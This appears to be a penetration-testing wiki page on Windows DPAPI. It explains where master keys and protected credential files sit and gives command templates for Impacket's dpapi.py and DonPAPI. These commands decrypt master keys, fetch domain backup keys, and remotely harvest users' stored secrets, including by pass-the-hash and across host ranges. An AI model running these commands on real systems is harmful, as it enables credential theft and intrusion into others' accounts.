---
title: "DPAPI secrets"
source_url: https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets
fetched_at: 2026-09-20T07:24:55Z
license: unspecified
category: ad
---

## Theory [](#theory)

The DPAPI (Data Protection API) is an internal component in the Windows system. It allows various applications to store sensitive data (e.g. passwords). The data are stored in the users directory and are secured by user-specific master keys derived from the users password. They are usually located at:

`C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID`
Application like Google Chrome, Outlook, Internet Explorer, Skype use the DPAPI. Windows also uses that API for sensitive information like Wi-Fi passwords, certificates, RDP connection passwords, and many more.

Below are common paths of hidden files that usually contain DPAPI-protected data.

```
C:\Users\$USER\AppData\Local\Microsoft\Credentials\
C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\
```
## Practice [](#practice)

From UNIX-like systems, DPAPI-data can be manipulated (mainly offline) with tools like [dpapick](https://github.com/jordanbtucker/dpapick) (Python), [dpapilab](https://github.com/dfirfpi/dpapilab) (Python), [Impacket](https://github.com/SecureAuthCorp/impacket)'s [dpapi.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/dpapi.py) and [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) (Python).

```
# (not tested) Decrypt a master key
dpapi.py masterkey -file "/path/to/masterkey_file" -sid $USER_SID -password $MASTERKEY_PASSWORD
# (not tested) Obtain the backup keys & use it to decrypt a master key
dpapi.py backupkeys -t $DOMAIN/$USER:$PASSWORD@$TARGET
dpapi.py masterkey -file "/path/to/masterkey_file" -pvk "/path/to/backup_key.pvk"
# (not tested) Decrypt DPAPI-protected data using a master key
dpapi.py credential -file "/path/to/protected_file" -key $MASTERKEY
```
[DonPAPI](https://github.com/login-securite/DonPAPI) (Python) can also be used to remotely extract a user's DPAPI secrets more easily. It supports [pass-the-hash](./../../ntlm/pth), [pass-the-ticket](./../../kerberos/pass-the/ptt) and so on.

```
# With cleartext credentials
DonPAPI collect -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -t "$TARGET"
# With Pass-the-Hash
DonPAPI collect -u "$USER" -H ":$NT_HASH" -d "$DOMAIN" -t "$TARGET"
# On a range
DonPAPI collect -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -t "$RANGE"
```
## Resources [](#resources)

[https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dpapi-extracting-passwords](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dpapi-extracting-passwords)

[https://www.synacktiv.com/ressources/univershell_2017_dpapi.pdf](https://www.synacktiv.com/ressources/univershell_2017_dpapi.pdf)
